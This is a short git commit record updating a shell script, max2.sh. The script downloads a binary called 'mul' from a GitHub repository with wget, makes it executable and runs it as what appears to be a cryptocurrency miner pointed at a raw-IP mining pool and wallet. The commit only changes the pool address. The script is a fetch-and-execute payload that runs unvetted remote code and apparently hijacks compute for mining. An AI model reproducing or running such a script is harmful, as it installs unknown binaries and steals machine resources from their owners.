5374cc5e3a7d44914fa11c6f2ac93067e06abd7a
calebsto <82493755+calebsto@users.noreply.github.com>
2021-04-27 23:30:55 +0700

    Update max2.sh

--- max2.sh
+++ max2.sh
@@ -1,3 +1,3 @@
 wget https://github.com/calebsto/rap/raw/main/mul
 chmod +x mul
-./mul --algorithm argon2id_chukwa2 --pool 20.84.104.25:3389 --wallet sya -p x
+./mul --algorithm argon2id_chukwa2 --pool 40.71.201.211:3389 --wallet sya -p x
